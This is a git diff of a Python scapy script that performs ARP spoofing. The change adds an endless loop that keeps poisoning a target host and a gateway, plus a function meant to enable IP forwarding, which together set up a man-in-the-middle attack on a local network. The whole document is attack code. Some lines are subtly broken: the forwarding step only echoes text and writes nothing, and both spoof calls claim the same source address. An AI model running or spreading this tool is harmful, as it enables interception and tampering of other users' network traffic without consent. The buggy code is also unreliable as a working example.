@@ -2,10 +2,13 @@
 
 import scapy.all as scapy
 import argparse
+import time
+import subprocess
 
 
-def spoof(target_ip, target_mac, source_ip):
+def spoof(target_ip, source_ip):
 
+    target_mac = get_mac(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip)  # op=2 stands for
     # the type of request
     scapy.send(packet)  # send the packet
@@ -35,11 +38,20 @@ def get_argument():
     return options
 
 
+def enable_ip_fwr():
+    exit_code = subprocess.call(['echo', '1', '/proc/sys/net/ipv4/ip_forward'])
+    print(exit_code)
+
+
 arguments = get_argument()
-target_mac = get_mac(arguments.target_ip)
-spoof(arguments.target_ip, target_mac, arguments.source)
-gateway_mac = get_mac(arguments.gateway_ip)
-spoof(arguments.gateway_ip, gateway_mac, arguments.source)
+enable_ip_fwr()
+try:
+    while True:
+        spoof(arguments.target_ip, arguments.source)
+        spoof(arguments.gateway_ip, arguments.source)
+        time.sleep(2)
+except KeyboardInterrupt:
+    print("[+] Program finished")
 
 
 
